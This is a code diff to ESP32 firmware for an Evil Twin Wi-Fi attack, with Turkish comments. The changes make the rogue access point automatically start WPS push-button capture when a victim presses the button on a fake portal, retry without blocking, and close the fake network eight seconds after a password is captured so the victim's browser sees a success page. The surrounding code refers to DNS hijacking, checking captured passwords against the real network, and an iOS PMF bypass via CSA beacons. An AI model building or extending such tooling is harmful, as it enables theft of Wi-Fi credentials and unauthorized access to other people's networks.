@@ -19,6 +19,8 @@ uint8_t evil_twin_bssid[6] = {0};
 bool et_wps_pbc_running  = false;
 bool et_wps_pbc_found    = false;
 char et_wps_pbc_pass[65] = {0};
+static unsigned long et_wps_retry_after  = 0; // non-blocking retry timer
+static unsigned long et_wps_stop_at      = 0; // WPS başarı → ET gecikmeli kapat
 
 // ─── İç değişkenler ───────────────────────────────────────────────────────────
 static DNSServer dns_server;
@@ -104,6 +106,7 @@ void et_stop_wps_pbc() {
   if (!et_wps_pbc_running) return;
   et_wps_pbc_running = false;
   et_wps_evt         = 0;
+  et_wps_retry_after = 0;
   esp_wifi_wps_disable();
   DEBUG_PRINTLN("ET WPS PBC: durduruldu");
 }
@@ -111,6 +114,20 @@ void et_stop_wps_pbc() {
 // ─── WPS PBC Döngüsü (evil_twin_loop içinden çağrılır) ───────────────────────
 static void et_wps_pbc_loop() {
   if (!et_wps_pbc_running) return;
+
+  unsigned long now = millis();
+
+  // Retry bekleme süresi dolmadıysa çık
+  if (et_wps_retry_after != 0) {
+    if (now < et_wps_retry_after) return;
+    // Süre doldu — yeniden başlat
+    et_wps_retry_after = 0;
+    esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PBC);
+    esp_wifi_wps_enable(&cfg);
+    esp_wifi_wps_start(0);
+    et_wps_started_ms = now;
+    return;
+  }
 
   if (et_wps_evt == 1) {
     // Başarı — şifre yakalandı
@@ -126,28 +143,24 @@ static void et_wps_pbc_loop() {
       // Şifreyi gerçek AP'de doğrula (arka planda, AP çalışmaya devam eder)
       evil_twin_test_password(pw);
     }
+    // Başarı sayfasının kurban tarafından alınmasına yetecek süre bekle,
+    // sonra sahte AP'yi kapat. 8 saniye: JS 4s'de polling yapar + sayfa yükleme.
+    et_wps_stop_at = millis() + 8000UL;
+    DEBUG_PRINTLN("ET WPS PBC: 8s sonra Evil Twin durdurulacak");
 
   } else if (et_wps_evt == -1) {
-    // Hata veya timeout — 5 saniye sonra yeniden dene
+    // Hata — 5 saniye sonra yeniden dene (non-blocking)
     DEBUG_PRINTLN("ET WPS PBC: hata, 5s sonra yeniden denenecek");
     et_wps_evt = 0;
     esp_wifi_wps_disable();
-    delay(5000);
-    esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PBC);
-    esp_wifi_wps_enable(&cfg);
-    esp_wifi_wps_start(0);
-    et_wps_started_ms = millis();
+    et_wps_retry_after = now + 5000UL;
 
-  } else if (millis() - et_wps_started_ms > ET_WPS_PBC_TIMEOUT_MS) {
-    // 2 dakika geçti — yeniden başlat
+  } else if (now - et_wps_started_ms > ET_WPS_PBC_TIMEOUT_MS) {
+    // 2 dakika geçti — 1 saniye sonra yeniden başlat (non-blocking)
     DEBUG_PRINTLN("ET WPS PBC: zaman asimi, yeniden baslaniyor");
     et_wps_evt = 0;
     esp_wifi_wps_disable();
-    delay(1000);
-    esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PBC);
-    esp_wifi_wps_enable(&cfg);
-    esp_wifi_wps_start(0);
-    et_wps_started_ms = millis();
+    et_wps_retry_after = now + 1000UL;
   }
 }
 
@@ -401,6 +414,10 @@ void start_evil_twin(int wifi_number) {
   dns_server.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
 
   et_start_sniffer();
+
+  // WPS PBC'yi otomatik başlat — kurban portaldaki WPS tuşuna bastığında
+  // ESP32 hazır bekliyor olsun; manuel admin panel adımına gerek kalmasın.
+  et_start_wps_pbc();
 }
 
 // ─── Şifre testi — AP KAPANMAZ ────────────────────────────────────────────────
@@ -491,6 +508,15 @@ void evil_twin_loop() {
   // WPS PBC arka plan kontrolü — önce çalıştır, kritik yol
   et_wps_pbc_loop();
 
+  // WPS başarı sonrası gecikmeli ET kapatma: başarı sayfası kurbanın tarayıcısına
+  // ulaşsın diye 8 saniye beklenir, sonra sahte AP tamamen kapanır.
+  if (et_wps_stop_at && millis() >= et_wps_stop_at) {
+    et_wps_stop_at = 0;
+    DEBUG_PRINTLN("ET WPS PBC: gecikme doldu, Evil Twin kapatılıyor");
+    stop_evil_twin();
+    return;
+  }
+
   unsigned long now = millis();
 
   // CSA beacon: her CSA_INTERVAL_MS ms'de bir — iOS PMF bypass
@@ -539,10 +565,12 @@ void stop_evil_twin() {
   memset(et_last_client, 0, 6);  // Hedef MAC sıfırla
   led_off();
 
-  // WPS PBC varsa durdur
+  // WPS PBC varsa durdur; gecikmeli stop timer'ı da sıfırla
+  et_wps_stop_at = 0;
   if (et_wps_pbc_running) {
     et_wps_pbc_running = false;
     et_wps_evt         = 0;
+    et_wps_retry_after = 0;
     esp_wifi_wps_disable();
   }
 
